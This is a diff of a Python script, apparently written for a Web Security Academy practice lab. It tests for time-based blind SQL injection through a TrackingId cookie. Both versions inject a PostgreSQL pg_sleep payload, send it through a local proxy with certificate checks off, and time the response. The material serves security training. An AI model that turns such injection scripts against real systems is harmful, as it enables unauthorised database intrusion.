@@ -1,32 +1,36 @@
-import sys
 import requests
 import urllib3
-import urllib
-
+import urllib.parse
+import time 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+url = "https://0a6500c10430d2e480f9eec500390028.web-security-academy.net"
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def blind_sqli_check(url):
-    sqli_payload = "' || (SELECT pg_sleep(10))--"
-    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-    cookies = {'TrackingId': 'fY3mWGvtddfW37rS' + sqli_payload_encoded, 'session': '3tjAqEsmAUv1oSufDDKMp8Dpr9LKqwcd'}
-    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-    if int(r.elapsed.total_seconds()) > 10:
-        print("(+) Vulnerable to blind-based SQL injection")
-    else:
-        print("(-) Not vulnerable to blind based SQL injection")
+initial_response = requests.get(url, proxies=proxies, verify=False)
 
+# Extract cookies from the response
+cookie_jar = initial_response.cookies
+tracking_id = cookie_jar.get('TrackingId')
+session_id = cookie_jar.get('session')
 
-def main():
-    if len(sys.argv) != 2:
-        print("(+) Usage: %s <url>" % sys.argv[0])
-        pring("(+) Example: %s www.example.com" % sys.argv[0])
-        sys.exit(-1)
+#exploit the website and return the response 
+def req_visit (raw_injection):
+	
+	encoded_injection = urllib.parse.quote(raw_injection)
 
-    url = sys.argv[1]
-    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
-    blind_sqli_check(url)
+	# Send SQLi request with injected cookie
+	cookies = {
+	    'TrackingId': tracking_id + encoded_injection,
+	    'session': session_id
+	}
+	start = time.time()
+	injection_response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
+	end = time.time()
+	if (end - start >= 10):
+		print ("got it")
+	else:
+		print ("False")
 
-if __name__ == "__main__":
-    main()
+raw_injection = f"'||pg_sleep(10)--"
+req_visit(raw_injection)
